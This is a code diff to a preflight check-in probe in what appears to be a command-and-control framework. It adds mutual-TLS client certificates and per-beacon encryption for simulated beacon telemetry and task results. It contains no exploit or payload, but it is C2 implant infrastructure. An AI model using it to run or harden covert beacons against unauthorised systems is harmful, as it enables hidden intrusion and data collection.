@@ -52,6 +52,36 @@ class CheckinProbe:
         return C2Server(host=self.host, use_ssl=True,
                         cert_dir=self.cert_dir)._get_ssl_context()
 
+    def _client_ssl_context(self, beacon_id: str):
+        """Client context that presents a beacon's client certificate.
+
+        The listener REQUIRES a client certificate by default (mTLS) and a
+        real beacon carries one issued at BUILD time, so the probe issues
+        its own for the throwaway identity. Without this the gate could
+        never pass even though a real deploy works.
+        """
+        import os as _os
+        import ssl as _ssl
+        import tempfile as _tempfile
+
+        from phantom.utils.beacon_auth import issue_client_certificate
+        from phantom.utils.paths import certs_dir
+
+        ctx = _ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = _ssl.CERT_NONE
+        material = issue_client_certificate(beacon_id,
+                                            self.cert_dir or certs_dir())
+        d = _tempfile.mkdtemp(prefix="phantom-probe-cert-")
+        crt = _os.path.join(d, "client.crt")
+        key = _os.path.join(d, "client.key")
+        with open(crt, "w", encoding="utf-8") as fh:
+            fh.write(material["client_cert_pem"])
+        with open(key, "w", encoding="utf-8") as fh:
+            fh.write(material["client_key_pem"])
+        ctx.load_cert_chain(crt, key)
+        return ctx
+
     def probe(self, beacon_id: str, sysinfo: str = "", netinfo: str = "",
               result_payload: str = "") -> CheckinResult:
         import json as _json
@@ -61,7 +91,7 @@ class CheckinProbe:
         from aiohttp import web
         import aiohttp
         import phantom.core.c2_server as mod
-        from phantom.utils.c2_crypto import encrypt_data, decrypt_data
+        from phantom.utils.c2_crypto import encrypt_for_beacon, decrypt_for_beacon
         from phantom.utils.beacon_auth import (
             enroll_or_get_secret, isolated_registry, sign_request)
 
@@ -116,15 +146,21 @@ class CheckinProbe:
                     ssl_ctx = None
                     scheme = "http"
                     if self.use_ssl:
-                        import ssl as _ssl
-                        ssl_ctx = _ssl.create_default_context()
-                        ssl_ctx.check_hostname = False
-                        ssl_ctx.verify_mode = _ssl.CERT_NONE
+                        try:
+                            ssl_ctx = self._client_ssl_context(beacon_id)
+                        except Exception as e:
+                            await runner.cleanup()
+                            return CheckinResult(
+                                ok=False, beacon_id=beacon_id,
+                                error=(f"probe client certificate "
+                                       f"unavailable: {e}"))
                         scheme = "https"
 
                     try:
-                        telemetry = encrypt_data(_json.dumps({
-                            "sysinfo": sysinfo, "netinfo": netinfo}))
+                        # Same per-beacon derivation the beacon uses: the
+                        # probe must prove THAT path, not the deployment key.
+                        telemetry = encrypt_for_beacon(_json.dumps({
+                            "sysinfo": sysinfo, "netinfo": netinfo}), beacon_id)
                         async with aiohttp.ClientSession() as sess:
                             async with sess.post(
                                     f"{scheme}://{self.host}:{port}/api/v1/ping",
@@ -136,14 +172,15 @@ class CheckinProbe:
                                         ok=False, beacon_id=beacon_id,
                                         error=f"checkin http {resp.status}")
                                 body = await resp.text()
-                                decrypted = decrypt_data(body)
+                                decrypted = decrypt_for_beacon(body, beacon_id)
                                 if "tasks" not in decrypted:
                                     return CheckinResult(
                                         ok=False, beacon_id=beacon_id,
                                         error="decrypted response lacks tasks list")
                             if result_payload:
-                                result_body = encrypt_data(_json.dumps({
-                                    "task_id": "preflight", "output": result_payload}))
+                                result_body = encrypt_for_beacon(_json.dumps({
+                                    "task_id": "preflight", "output": result_payload}),
+                                    beacon_id)
                                 async with sess.post(
                                         f"{scheme}://{self.host}:{port}/api/v1/result",
                                         data=result_body,
